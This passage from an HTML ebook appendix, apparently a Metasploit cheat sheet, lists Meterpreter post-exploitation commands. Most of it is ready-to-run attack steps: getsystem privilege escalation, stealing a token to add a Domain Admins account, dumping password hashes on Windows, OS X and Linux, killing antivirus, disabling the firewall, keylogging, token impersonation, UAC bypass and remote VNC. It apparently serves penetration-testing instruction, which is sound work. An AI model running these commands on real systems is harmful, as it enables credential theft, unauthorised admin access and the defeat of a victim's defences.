[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
root@bt://opt/framework3/msf3#</pre><p class="calibre2">This one liner will create a payload and automatically generate it in an executable format.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="meterpreter_post_exploitation_commands">Meterpreter Post Exploitation Commands</h2></div></div></div><p class="calibre2">Elevate your permissions on Windows-based systems using Meterpreter:<a id="IDX-APP-B-0226" class="strong"/><a id="IDX-APP-B-0227" class="strong"/><a id="IDX-APP-B-0228" class="strong"/><a id="IDX-APP-B-0229" class="strong"/><a id="IDX-APP-B-0230" class="strong"/><a id="IDX-APP-B-0231" class="strong"/><a id="IDX-APP-B-0232" class="strong"/><a id="IDX-APP-B-0233" class="strong"/><a id="IDX-APP-B-0234" class="strong"/><a id="IDX-APP-B-0235" class="strong"/><a id="IDX-APP-B-0236" class="strong"/><a id="IDX-APP-B-0237" class="strong"/></p><a id="I_programlisting_d1e22465" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">use priv</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getsystem</code></strong></pre><p class="calibre2">Steal a domain administrator token from a given process ID, add a domain account, and then add it to the <span class="strong"><em class="calibre4">Domain Admins</em></span> group:</p><a id="I_programlisting_d1e22477" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">ps</code></strong>

meterpreter &gt; <strong class="calibre3"><code class="calibre6">steal_token 1784</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong>

C:\Windows\system32&gt;<strong class="calibre3"><code class="calibre6">net user metasploit p@55w0rd /ADD /DOMAIN</code></strong>
C:\Windows\system32&gt;<strong class="calibre3"><code class="calibre6">net group "Domain Admins" metasploit /ADD /DOMAIN</code></strong></pre><p class="calibre2">Dump password hashes from the SAM database:</p><a id="I_programlisting_d1e22495" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">use priv</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getsystem</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">hashdump</code></strong></pre><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">On Win2k8 you may need to migrate to a process that is running as SYSTEM if <code class="literal">-getsystem</code> and <code class="literal">hashdump</code> throw exceptions.<a id="IDX-APP-B-0238" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">Automigrate to a separate process:</p><a id="I_programlisting_d1e22519" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run migrate</code></strong></pre><p class="calibre2">Kill antivirus processes running on the target via the <span class="strong"><em class="calibre4">killav</em></span> Meterpreter script:<a id="IDX-APP-B-0239" class="strong"/></p><a id="I_programlisting_d1e22532" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run killav</code></strong></pre><p class="calibre2">Capture keystrokes on target machines from within a particular process:</p><a id="I_programlisting_d1e22538" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">ps</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">migrate 1436</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">keyscan_start</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">keyscan_dump</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">keyscan_stop</code></strong></pre><p class="calibre2">Use Incognito to impersonate an administrator:</p><a id="I_programlisting_d1e22556" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">use incognito</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">list_tokens -u</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">use priv</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getsystem</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">list_tokens -u</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">impersonate_token IHAZSECURITY\\Administrator</code></strong></pre><p class="calibre2">See what protection mechanisms are in place on the compromised target, display the help menu, disable Windows Firewall, and kill all counter-measures found:<a id="IDX-APP-B-0240" class="strong"/><a id="IDX-APP-B-0241" class="strong"/><a id="IDX-APP-B-0242" class="strong"/><a id="IDX-APP-B-0243" class="strong"/><a id="IDX-APP-B-0244" class="strong"/><a id="IDX-APP-B-0245" class="strong"/><a id="IDX-APP-B-0246" class="strong"/></p><a id="I_programlisting_d1e22603" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run getcountermeasure</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">run getcountermeasure -h</code></strong>
meterpreter &gt; <strong class="calibre3"><code class="calibre6">run getcountermeasure -d -k</code></strong></pre><p class="calibre2">Identify whether the compromised system is a virtual machine:</p><a id="I_programlisting_d1e22615" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run checkvm</code></strong></pre><p class="calibre2">Drop into a command shell for a current Meterpreter console session:</p><a id="I_programlisting_d1e22621" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong></pre><p class="calibre2">Get a remote GUI (VNC) on the target machine:</p><a id="I_programlisting_d1e22628" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run vnc</code></strong></pre><p class="calibre2">Background a currently running Meterpreter console:</p><a id="I_programlisting_d1e22634" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">background</code></strong></pre><p class="calibre2">Bypass Windows User Access Control:</p><a id="I_programlisting_d1e22640" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/windows/escalate/bypassuac</code></strong></pre><p class="calibre2">Dump Hashes on an OS X system:<a id="IDX-APP-B-0247" class="strong"/></p><a id="I_programlisting_d1e22649" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/osx/gather/hashdump</code></strong></pre><p class="calibre2">Dump Hashes on a Linux system:<a id="IDX-APP-B-0248" class="strong"/></p><a id="I_programlisting_d1e22658" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/linux/gather/hashdump</code></strong></pre></div></section></body></html>